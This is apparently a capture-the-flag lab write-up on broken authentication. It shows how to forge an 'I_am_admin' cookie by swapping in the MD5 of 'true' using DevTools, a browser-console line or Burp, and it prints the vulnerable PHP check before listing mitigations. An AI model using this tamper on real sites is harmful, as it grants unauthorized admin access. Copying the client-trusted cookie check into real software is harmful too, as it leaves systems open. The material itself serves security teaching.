# A2 - Broken Authentication (Cookie Manipulation)

OWASP Top 10 (2017) vulnerability. The application controls admin privileges through an `I_am_admin` cookie whose value is an MD5 hash manipulable by the client.

---

## Steps to Obtain the Flag

### 1. Identify the Cookie

Open DevTools (F12) → `Application` → `Cookies`. You'll find:
```
I_am_admin=68934a3e9455fa72420237eb05902327
```

### 2. Decrypt the Hash

The MD5 hash `68934a3e9455fa72420237eb05902327` → corresponds to `false`.

### 3. Generate the Hash for `true`

```bash
echo -n "true" | md5sum
# b326b5062b2f0e69046810717534cb09
```

### 4. Exploit

**Method A – DevTools:**
1. DevTools → `Application` → `Cookies`
2. Change the `I_am_admin` value to `b326b5062b2f0e69046810717534cb09`
3. Reload the page → the **flag** is displayed

**Method B – Browser Console:**
```js
document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09; path=/";
location.reload();
```

**Method C – Burp Suite:**
```
Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09
```

### 5. Why It Works

The server blindly trusts the cookie value without cryptographic validation or verification of the actual user state:
```php
// Vulnerable Code
if ($_COOKIE['I_am_admin'] === md5('true')) {
    showFlag();
}
```

---

## MD5 Hash Reference

| Value   | MD5                              |
|---------|----------------------------------|
| `false` | 68934a3e9455fa72420237eb05902327 |
| `true`  | b326b5062b2f0e69046810717534cb09 |

---

## Impact

- **Privilege Escalation:** any user can become an admin.
- **Authentication Bypass:** without valid credentials.
- **Complete Compromise:** access to restricted functionality and data.

---

## Mitigation

1. **Server-side Access Control:** verify user role against database, never from a cookie.
2. **Server-side Sessions:** store state in `$_SESSION`, not on the client.
3. **Sign Cookies with HMAC** or use **JWT** to detect tampering.
4. **Cookie Security Flags:** `HttpOnly`, `Secure`, `SameSite=Strict`.
5. **Don't Use MD5 for Security:** it's cryptographically broken; use SHA-256 with salt or `password_hash()`.
